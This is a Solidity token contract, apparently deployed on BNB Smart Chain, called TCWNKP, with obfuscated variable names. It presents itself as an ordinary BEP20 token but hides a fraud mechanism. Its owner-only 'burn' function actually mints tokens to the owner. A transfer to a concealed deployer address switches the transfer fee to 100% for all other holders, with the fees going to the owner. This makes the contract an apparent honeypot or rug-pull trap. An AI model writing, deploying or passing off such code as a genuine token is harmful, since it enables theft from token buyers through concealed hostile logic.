/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.7.0;
contract TCWNKP {
address public  phChIH = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  xhYwAN = 100000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public constant FNDHxx = 9+1;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  DrUDcR = address(0);
address public  hinTnw = address(0);
address public  HLZsky = address(0);
uint256 public  wZnPlL = 10000000000000000000;
uint256 public  YVvEuP = 10000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  ztyqQb = 100000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  dRujMu = 10000000000000000;
uint8 public constant decimals = 18;
string public  symbol = "TCWNKP";
address public  rCuCuQ = address(0);
uint256 public  kdrjVs = 100000000000000000000000;
address public owner;
uint256 public  BkpuYW = 100000000000000000000;
address public  NedtcA = address(0);
uint256 private  xPJnBh = 10000000000000;
string public  name = "TCWNKP";
address private  UqaCBq = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  SFUpUi = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () {
UqaCBq = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "rFhrTq");
require(to != address(0), "rFhrTq");
require(amount <= balanceOf[from], "rFhrTq");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* FNDHxx/xPJnBh ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==UqaCBq){
xPJnBh = 9+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}